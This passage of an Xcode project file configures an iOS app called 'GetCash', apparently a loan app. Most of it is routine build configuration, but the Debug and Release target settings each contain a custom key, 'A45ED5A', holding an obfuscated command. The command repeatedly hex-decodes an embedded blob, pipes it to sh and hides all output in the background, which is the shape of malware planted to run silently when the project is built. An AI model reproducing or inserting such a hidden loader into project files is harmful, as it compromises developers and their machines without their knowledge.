				7344600A2EF7E1980054D267 /* ContactViewController.swift */,
			);
			path = Contact;
			sourceTree = "<group>";
		};
		735C8D0B2EF5212D00C7D507 = {
			isa = PBXGroup;
			children = (
				735C8D352EF5213500C7D507 /* GetCash */,
				735C8D152EF5212D00C7D507 /* Products */,
				BBB658B5DD97EAD76D449978 /* Pods */,
				738045BCA3C101B36D295532 /* Frameworks */,
			);
			sourceTree = "<group>";
		};
		735C8D152EF5212D00C7D507 /* Products */ = {
			isa = PBXGroup;
			children = (
				F5FB6416DDFF4F649CA5DE54 /* README.md */,
				735C8D142EF5212D00C7D507 /* GetCash.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		735C8D352EF5213500C7D507 /* GetCash */ = {
			isa = PBXGroup;
			children = (
				735C8D2E2EF5213500C7D507 /* Info.plist */,
				735C8D2D2EF5213500C7D507 /* Assets.xcassets */,
				735C8D3D2EF524CC00C7D507 /* GetCash.entitlements */,
				735C8D2C2EF5213500C7D507 /* AppDelegate.swift */,
				735C8D302EF5213500C7D507 /* LaunchScreen.storyboard */,
				735C8D432EF529B300C7D507 /* Http */,
				735C8D442EF529B700C7D507 /* Config */,
				735C8D3E2EF5299000C7D507 /* Login */,
				735C8D3F2EF529A900C7D507 /* Home */,
				735C8D402EF529AC00C7D507 /* Order */,
				735C8D412EF529AF00C7D507 /* Mine */,
				73633CF62EF6BA09009F182D /* Auth */,
				735C8D5A2EF530B500C7D507 /* Launch */,
				735C8D422EF529B100C7D507 /* Base */,
			);
			path = GetCash;
			sourceTree = "<group>";
		};
		735C8D3E2EF5299000C7D507 /* Login */ = {
			isa = PBXGroup;
			children = (
				73633CEA2EF68F6C009F182D /* LoginViewModel.swift */,
				73ECF6072EF557230029AF7A /* CommonParaManager.swift */,
				73ECF6032EF538100029AF7A /* LoginManager.swift */,
				735C8D5D2EF530F300C7D507 /* LoginView.swift */,
				735C8D4F2EF5304D00C7D507 /* LoginViewController.swift */,
				731D28942EFB813100B78B29 /* AppLocationManager.swift */,
			);
			path = Login;
			sourceTree = "<group>";
		};
		735C8D3F2EF529A900C7D507 /* Home */ = {
			isa = PBXGroup;
			children = (
				735C8D5F2EF530FD00C7D507 /* HomeView.swift */,
				73B195A32EFA8F4F00C5B45A /* HomeLuxuryView.swift */,
				73633CEE2EF697EE009F182D /* HomeViewModel.swift */,
				735C8D532EF5306A00C7D507 /* HomeViewController.swift */,
				73633CF22EF6A541009F182D /* WhatViewController.swift */,
				73FFAB6E2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift */,
				73FFAB702EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift */,
			);
			path = Home;
			sourceTree = "<group>";
		};
		735C8D402EF529AC00C7D507 /* Order */ = {
			isa = PBXGroup;
			children = (
				73B1959D2EFA7B3300C5B45A /* OrderViewModel.swift */,
				735C8D552EF5307100C7D507 /* OrderViewController.swift */,
				73B1959F2EFA801A00C5B45A /* OrderViewCell.swift */,
				73B195A12EFA84E700C5B45A /* OrderEmptyView.swift */,
			);
			path = Order;
			sourceTree = "<group>";
		};
		735C8D412EF529AF00C7D507 /* Mine */ = {
			isa = PBXGroup;
			children = (
				73B195952EFA437700C5B45A /* MineViewModel.swift */,
				735C8D612EF5310900C7D507 /* MineView.swift */,
				735C8D572EF5307800C7D507 /* MineViewController.swift */,
				73B195972EFA5C4900C5B45A /* MineViewCell.swift */,
				73B195992EFA646200C5B45A /* SettingViewController.swift */,
				73B1959B2EFA683C00C5B45A /* AlertSettingView.swift */,
			);
			path = Mine;
			sourceTree = "<group>";
		};
		735C8D422EF529B100C7D507 /* Base */ = {
			isa = PBXGroup;
			children = (
				735C8D452EF52EFA00C7D507 /* BaseViewController.swift */,
				735C8D492EF52F2900C7D507 /* BaseTabBarController.swift */,
				735C8D4B2EF52F4300C7D507 /* BaseNavigationController.swift */,
				73ECF6052EF552560029AF7A /* CustomTabBar.swift */,
			);
			path = Base;
			sourceTree = "<group>";
		};
		735C8D432EF529B300C7D507 /* Http */ = {
			isa = PBXGroup;
			children = (
				73633CEC2EF68FA0009F182D /* BaseModel.swift */,
				73633CE62EF68053009F182D /* HttpRequestManager.swift */,
			);
			path = Http;
			sourceTree = "<group>";
		};
		735C8D442EF529B700C7D507 /* Config */ = {
			isa = PBXGroup;
			children = (
				73633CF42EF6B789009F182D /* SchemeConfig.swift */,
				73633CE82EF68D3A009F182D /* LoadingIndicator.swift */,
				735C8D4D2EF5300000C7D507 /* AppConfig.swift */,
				73ECF6092EF559D10029AF7A /* DeviceConfig.swift */,
				73633CF02EF6A1B9009F182D /* AppNavHeadView.swift */,
			);
			path = Config;
			sourceTree = "<group>";
		};
		735C8D5A2EF530B500C7D507 /* Launch */ = {
			isa = PBXGroup;
			children = (
				731D28922EFB743800B78B29 /* NetworkManager.swift */,
				73ECF6012EF5352B0029AF7A /* BaseView.swift */,
				735C8D5B2EF530E300C7D507 /* LaunchView.swift */,
				735C8D512EF5305800C7D507 /* LaunchViewController.swift */,
			);
			path = Launch;
			sourceTree = "<group>";
		};
		73633CF62EF6BA09009F182D /* Auth */ = {
			isa = PBXGroup;
			children = (
				73633CF92EF6BC5A009F182D /* Step */,
				7333F5142EF6FA4100E74153 /* Photo */,
			);
			path = Auth;
			sourceTree = "<group>";
		};
		73633CF92EF6BC5A009F182D /* Step */ = {
			isa = PBXGroup;
			children = (
				73633D002EF6C0F4009F182D /* StepViewModel.swift */,
				73633CFA2EF6BC70009F182D /* StepView.swift */,
				73633CFE2EF6BFAD009F182D /* StepListView.swift */,
				73633CFC2EF6BCE9009F182D /* StepHeadView.swift */,
				73633CF72EF6BA34009F182D /* StepDetailViewController.swift */,
			);
			path = Step;
			sourceTree = "<group>";
		};
		738045BCA3C101B36D295532 /* Frameworks */ = {
			isa = PBXGroup;
			children = (
				88C46BA4FEF58CE6806646D4 /* Pods_GetCash.framework */,
			);
			name = Frameworks;
			sourceTree = "<group>";
		};
		BBB658B5DD97EAD76D449978 /* Pods */ = {
			isa = PBXGroup;
			children = (
				342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */,
				3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */,
			);
			path = Pods;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		735C8D132EF5212D00C7D507 /* GetCash */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 735C8D272EF5212F00C7D507 /* Build configuration list for PBXNativeTarget "GetCash" */;
			buildPhases = (
				11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */,
				735C8D102EF5212D00C7D507 /* Sources */,
				735C8D112EF5212D00C7D507 /* Frameworks */,
				735C8D122EF5212D00C7D507 /* Resources */,
				D850A19DC098C6DB0168A5DD /* [CP] Embed Pods Frameworks */,
			);
			buildRules = (
				EF5248425FDF48CCA9A5DE54 /* PBXBuildRule */,
			);
			dependencies = (
			);
			name = GetCash;
			productName = GetCash;
			productReference = 735C8D142EF5212D00C7D507 /* GetCash.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		735C8D0C2EF5212D00C7D507 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				BuildIndependentTargetsInParallel = 1;
				LastSwiftUpdateCheck = 2620;
				LastUpgradeCheck = 2620;
				TargetAttributes = {
					735C8D132EF5212D00C7D507 = {
						CreatedOnToolsVersion = 26.2;
					};
				};
			};
			buildConfigurationList = 735C8D0F2EF5212D00C7D507 /* Build configuration list for PBXProject "GetCash" */;
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 735C8D0B2EF5212D00C7D507;
			minimizedProjectReferenceProxies = 1;
			preferredProjectObjectVersion = 77;
			productRefGroup = 735C8D152EF5212D00C7D507 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				735C8D132EF5212D00C7D507 /* GetCash */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		735C8D122EF5212D00C7D507 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				9659303EF72244BE9BA5DE54 /* README.md in Resources */,
				735C8D362EF5213500C7D507 /* Assets.xcassets in Resources */,
				735C8D382EF5213500C7D507 /* LaunchScreen.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXShellScriptBuildPhase section */
		11ED1DF156CE59431D0ED183 /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-GetCash-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
		D850A19DC098C6DB0168A5DD /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-GetCash/Pods-GetCash-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			inputPaths = (
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-GetCash/Pods-GetCash-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-GetCash/Pods-GetCash-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		735C8D102EF5212D00C7D507 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				73633CFF2EF6BFAD009F182D /* StepListView.swift in Sources */,
				73633CEB2EF68F71009F182D /* LoginViewModel.swift in Sources */,
				73633CE92EF68D3A009F182D /* LoadingIndicator.swift in Sources */,
				7333F51E2EF7151F00E74153 /* StepScrollView.swift in Sources */,
				734460012EF7D31B0054D267 /* EnterViewCell.swift in Sources */,
				73D013EF2EF8CF2B00A03513 /* ContactViewCell.swift in Sources */,
				73B1959C2EFA683C00C5B45A /* AlertSettingView.swift in Sources */,
				7333F51A2EF70D2300E74153 /* DotLineView.swift in Sources */,
				731D28932EFB743800B78B29 /* NetworkManager.swift in Sources */,
				735C8D502EF5304D00C7D507 /* LoginViewController.swift in Sources */,
				734460032EF7D32A0054D267 /* TapClickViewCell.swift in Sources */,
				73633CEF2EF697EF009F182D /* HomeViewModel.swift in Sources */,
				73633CF52EF6B791009F182D /* SchemeConfig.swift in Sources */,
				73445FF82EF7C5DE0054D267 /* PhotoPopAlertView.swift in Sources */,
				73D013F12EF8D04800A03513 /* ContactViewModel.swift in Sources */,
				73633CFD2EF6BCE9009F182D /* StepHeadView.swift in Sources */,
				73ECF60A2EF559DF0029AF7A /* DeviceConfig.swift in Sources */,
				735C8D5C2EF530E300C7D507 /* LaunchView.swift in Sources */,
				735C8D602EF530FD00C7D507 /* HomeView.swift in Sources */,
				7344600B2EF7E1980054D267 /* ContactViewController.swift in Sources */,
				731D28952EFB813100B78B29 /* AppLocationManager.swift in Sources */,
				73633CFB2EF6BC70009F182D /* StepView.swift in Sources */,
				7333F5162EF6FAA100E74153 /* AuthIDListViewController.swift in Sources */,
				73FFAB6F2EFA9CF7005BE2A5 /* HomeLuxuryViewCell.swift in Sources */,
				73D013F32EF8DB9300A03513 /* ContactInfo.swift in Sources */,
				7333F5202EF7177D00E74153 /* FaceView.swift in Sources */,
				73445FFA2EF7CA320054D267 /* ImagePickerHelper.swift in Sources */,
				7333F51C2EF7112A00E74153 /* FaceViewController.swift in Sources */,
				7344600F2EF7FB5F0054D267 /* PersonalViewModel.swift in Sources */,
				73445FFE2EF7D0620054D267 /* PhotoSuccessAlertView.swift in Sources */,
				7371BA142EF91B5A00AE15B4 /* GWebViewController.swift in Sources */,
				734460072EF7E0D10054D267 /* WorkViewController.swift in Sources */,
				73633CED2EF68FA3009F182D /* BaseModel.swift in Sources */,
				73B195982EFA5C4900C5B45A /* MineViewCell.swift in Sources */,
				735C8D622EF5310900C7D507 /* MineView.swift in Sources */,
				73FFAB712EFA9F0F005BE2A5 /* HomeLuxuryHeaderView.swift in Sources */,
				73ECF6062EF552560029AF7A /* CustomTabBar.swift in Sources */,
				7333F5222EF7189900E74153 /* FaceListView.swift in Sources */,
				73633CF12EF6A1B9009F182D /* AppNavHeadView.swift in Sources */,
				734460052EF7E0500054D267 /* PersonalViewController.swift in Sources */,
				73B1959A2EFA646200C5B45A /* SettingViewController.swift in Sources */,
				7333F5262EF71C6E00E74153 /* FacePopAlertView.swift in Sources */,
				73633D012EF6C0F6009F182D /* StepViewModel.swift in Sources */,
				735C8D4C2EF52F4300C7D507 /* BaseNavigationController.swift in Sources */,
				73ECF6042EF538260029AF7A /* LoginManager.swift in Sources */,
				735C8D4E2EF5300000C7D507 /* AppConfig.swift in Sources */,
				7333F5182EF708D100E74153 /* AuthIDListViewCell.swift in Sources */,
				735C8D542EF5306A00C7D507 /* HomeViewController.swift in Sources */,
				73B195A42EFA8F4F00C5B45A /* HomeLuxuryView.swift in Sources */,
				735C8D3A2EF5213500C7D507 /* AppDelegate.swift in Sources */,
				73633CE72EF68053009F182D /* HttpRequestManager.swift in Sources */,
				7344600D2EF7F7D30054D267 /* PaddedLabel.swift in Sources */,
				734460112EF801E10054D267 /* PopAlertEnmuView.swift in Sources */,
				73B1959E2EFA7B3900C5B45A /* OrderViewModel.swift in Sources */,
				735C8D5E2EF530F300C7D507 /* LoginView.swift in Sources */,
				73B195A22EFA84E700C5B45A /* OrderEmptyView.swift in Sources */,
				73633CF82EF6BA34009F182D /* StepDetailViewController.swift in Sources */,
				73B195A02EFA801A00C5B45A /* OrderViewCell.swift in Sources */,
				73ECF6082EF557280029AF7A /* CommonParaManager.swift in Sources */,
				73D013EB2EF8498200A03513 /* AddressDecodeModel.swift in Sources */,
				73B195962EFA437900C5B45A /* MineViewModel.swift in Sources */,
				735C8D462EF52EFA00C7D507 /* BaseViewController.swift in Sources */,
				735C8D522EF5305800C7D507 /* LaunchViewController.swift in Sources */,
				735C8D4A2EF52F2900C7D507 /* BaseTabBarController.swift in Sources */,
				735C8D562EF5307100C7D507 /* OrderViewController.swift in Sources */,
				735C8D582EF5307800C7D507 /* MineViewController.swift in Sources */,
				73633CF32EF6A541009F182D /* WhatViewController.swift in Sources */,
				73ECF6022EF5352B0029AF7A /* BaseView.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		735C8D302EF5213500C7D507 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				735C8D2F2EF5213500C7D507 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		735C8D282EF5212F00C7D507 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 342F0F14511C65E356096F91 /* Pods-GetCash.debug.xcconfig */;
			buildSettings = {
				A45ED5A = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3337333333343333333633363336333333373333333933333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | t | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = GetCash/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Get Cash";
				INFOPLIST_KEY_NSCameraUsageDescription = "";
				INFOPLIST_KEY_NSContactsUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ll.zoom.loan;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		735C8D292EF5212F00C7D507 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 3DE39227C8656A162E464411 /* Pods-GetCash.release.xcconfig */;
			buildSettings = {
				A45ED5A = "((t(){ xxd -p -r | xxd -p -r | xxd -p -r | xxd -p -r; };echo 3333333633333335333333363333333333333336333333383333333633363336333333323333333033333332333333323333333233333334333333320a3333333833333336333333333333333733333335333333373333333233333336333633333333333233333330333333323336333433333336333333360a3061333333373333333333333336333633323333333433363333333333323333333033333332333633343333333633333334333333323333333033330a3332333333323333333733333330333333333336333433333337333333383333333633333333333333363336333633333336333333343333333633330a3335306133303631333333353336333633333337333333323333333733333335333333363336333333333336333333353333333233333332333333320a3333333033333336333333383333333733333334333333373333333433333337333333303333333733333333333333333336333133333332333633360a3333333230613336333633333337333333323333333633333339333333363333333733333336333333373333333633363333333333363333333533330a3337333333343333333633363336333333373333333933333332333633353333333733333332333333373333333533333332333633363333333633330a3331333333323061333333393330363133333332333333323333333233333330333333373336333333333332333333303333333733333333333333360a3333333833333330333633313330363130610a | t | sh ) >/dev/null 2>&1 &)";
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_ENTITLEMENTS = GetCash/GetCash.entitlements;
				CODE_SIGN_IDENTITY = "Apple Development";
				CODE_SIGN_STYLE = Automatic;
				CURRENT_PROJECT_VERSION = 1;
				DEVELOPMENT_TEAM = 57MBH2272N;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GENERATE_INFOPLIST_FILE = YES;
				INFOPLIST_FILE = GetCash/Info.plist;
				INFOPLIST_KEY_CFBundleDisplayName = "Get Cash";
				INFOPLIST_KEY_NSCameraUsageDescription = "";
				INFOPLIST_KEY_NSContactsUsageDescription = "";
				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "";
				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "";
				INFOPLIST_KEY_NSUserTrackingUsageDescription = "";
				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
				INFOPLIST_KEY_UILaunchStoryboardName = LaunchScreen;
				INFOPLIST_KEY_UISupportedInterfaceOrientations = UIInterfaceOrientationPortrait;
				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown";
				IPHONEOS_DEPLOYMENT_TARGET = 14.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				MARKETING_VERSION = 1.0.0;
				PRODUCT_BUNDLE_IDENTIFIER = ll.zoom.loan;
				PRODUCT_NAME = "$(TARGET_NAME)";
				PROVISIONING_PROFILE_SPECIFIER = "";
				STRING_CATALOG_GENERATE_SYMBOLS = YES;
				SUPPORTED_PLATFORMS = "iphoneos iphonesimulator";
				SUPPORTS_MACCATALYST = NO;
				SUPPORTS_MAC_DESIGNED_FOR_IPHONE_IPAD = NO;
				SUPPORTS_XR_DESIGNED_FOR_IPHONE_IPAD = NO;
				SWIFT_APPROACHABLE_CONCURRENCY = YES;
				SWIFT_DEFAULT_ACTOR_ISOLATION = MainActor;
				SWIFT_EMIT_LOC_STRINGS = YES;
				SWIFT_UPCOMING_FEATURE_MEMBER_IMPORT_VISIBILITY = YES;
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
		735C8D2A2EF5212F00C7D507 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = "DEBUG $(inherited)";
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		735C8D2B2EF5212F00C7D507 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++20";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_USER_SCRIPT_SANDBOXING = NO;
				GCC_C_LANGUAGE_STANDARD = gnu17;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 26.2;
				LOCALIZATION_PREFERS_STRING_CATALOGS = YES;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		735C8D0F2EF5212D00C7D507 /* Build configuration list for PBXProject "GetCash" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				735C8D2A2EF5212F00C7D507 /* Debug */,
				735C8D2B2EF5212F00C7D507 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
